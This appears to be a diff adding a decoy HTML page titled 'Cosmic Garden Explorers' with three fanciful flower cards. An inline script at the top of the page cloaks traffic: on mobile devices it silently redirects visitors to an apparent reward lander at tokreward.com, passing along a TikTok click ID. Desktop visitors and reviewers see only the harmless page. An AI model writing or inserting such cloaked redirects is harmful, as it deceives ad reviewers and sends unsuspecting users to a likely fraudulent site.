@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmXXX = urlParams.get("xxx");
+        const s = urlParams.get("s");
+        const ttclid = urlParams.get("ttclid");
+        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        const lander = `https://tokreward.com/api/v5/entry?s1=${s}&ttclid=${ttclid}`;
+        if (utmXXX === "__PLACEMENT__") { }
+        else if (isMobileDevice) { window.location.href = lander; } 
+        else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Garden Explorers</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #0f0f3f;
+            color: #e0e0ff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            background-color: #2a2a7f;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            color: #ffd700;
+        }
+        .card {
+            background-color: #1a1a5f;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+        }
+        .card img {
+            max-width: 100%;
+            border-radius: 10px;
+        }
+        footer {
+            background-color: #2a2a7f;
+            padding: 10px;
+            text-align: center;
+        }
+        a {
+            color: #ffd700;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Garden Explorers</h1>
+    </header>
+    <div class="container">
+        <div class="card">
+            <h2>Nebula Roses</h2>
+            <img src="https://placeholder.com/300x200" alt="Nebula Roses">
+            <p>Discover the beauty of interstellar floriculture.</p>
+        </div>
+        <div class="card">
+            <h2>Quantum Daisies</h2>
+            <img src="https://placeholder.com/300x200" alt="Quantum Daisies">
+            <p>Experience flowers that exist in multiple dimensions.</p>
+        </div>
+        <div class="card">
+            <h2>Gravity Tulips</h2>
+            <img src="https://placeholder.com/300x200" alt="Gravity Tulips">
+            <p>Grow flowers that defy the laws of physics.</p>
+        </div>
+    </div>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
